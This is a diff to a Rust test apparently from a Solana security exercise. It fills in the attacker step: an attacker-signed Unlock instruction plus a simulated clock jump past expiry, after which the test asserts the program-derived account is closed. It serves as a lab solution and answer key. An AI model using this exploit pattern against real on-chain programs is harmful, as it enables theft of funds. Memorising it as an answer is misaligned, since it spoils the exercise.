@@ -71,6 +71,39 @@ fn test() {
     let attacker_bal_before = svm.get_balance(&attacker.pubkey()).unwrap();
 
     // Write your code here - send transaction using the attacker's keypair
+    let unlock_ix = Instruction {
+        program_id,
+        accounts: vec![
+            AccountMeta {
+                pubkey: attacker.pubkey(),
+                is_signer: true,
+                is_writable: true,
+            },
+            AccountMeta {
+                pubkey: pda,
+                is_signer: false,
+                is_writable: true,
+            },
+            AccountMeta {
+                pubkey: system_program::ID,
+                is_signer: false,
+                is_writable: true,
+            },
+        ],
+        data: borsh::to_vec(&Cmd::Unlock { bump }).unwrap(),
+    };
+
+    let mut clock = svm.get_sysvar::<Clock>();
+    clock.unix_timestamp = (exp + 1) as i64;
+    svm.set_sysvar(&clock);
+
+    svm.send_transaction(Transaction::new_signed_with_payer(
+        &[unlock_ix],
+        Some(&attacker.pubkey()),
+        &[&attacker],
+        svm.latest_blockhash(),
+    ))
+    .unwrap();
 
     let acc = svm.get_account(&pda);
     assert_eq!(acc, None);
